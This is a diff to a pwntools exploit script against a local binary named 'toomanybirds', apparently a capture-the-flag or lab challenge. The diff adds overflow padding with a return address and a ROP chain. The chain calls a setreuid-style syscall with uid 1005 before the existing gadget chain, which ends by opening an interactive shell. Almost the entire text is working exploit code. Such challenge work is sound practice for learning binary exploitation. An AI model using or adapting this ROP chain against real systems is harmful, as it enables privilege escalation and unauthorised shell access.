@@ -9,10 +9,20 @@ from pwn import *
 
 process1 = process('./toomanybirds')
 print(process1.recvline())
-process1.sendline(b"-1")
+process1.send(b"32768")
 
 # Padding goes here
-p = b""
+p = b"H" * 512 + p64(0x00401e31) + b"H" * 16
+
+#
+p += p64(0x000000000044e580) # pop rax ; ret
+p += p64(0x71)
+p += p64(0x000000000040186a) # pop rdi ; ret
+p += p64(1005) # uid
+p += p64(0x0000000000405f97) # pop rsi ; ret
+p += p64(1005) # uid
+p += p64(0x000000000041cb14)
+
 
 p += p64(0x0000000000405f97) # pop rsi ; ret
 p += p64(0x00000000004ca0e0) # @ .data
@@ -90,10 +100,11 @@ p += p64(0x0000000000482c60) # add rax, 1 ; ret
 p += p64(0x0000000000482c60) # add rax, 1 ; ret
 p += p64(0x0000000000482c60) # add rax, 1 ; ret
 p += p64(0x0000000000482c60) # add rax, 1 ; ret
-p += p64(0x0000000000401223) # syscall
+#p += p64(0x0000000000401223) # syscall
+p += p64(0x000000000041cb14) # syscall
 
 output = p
 output += b"\n"
-output += b"h" * 65535
+output += b"h" * (32768 - len(p))
 process1.sendline(output)
 process1.interactive()
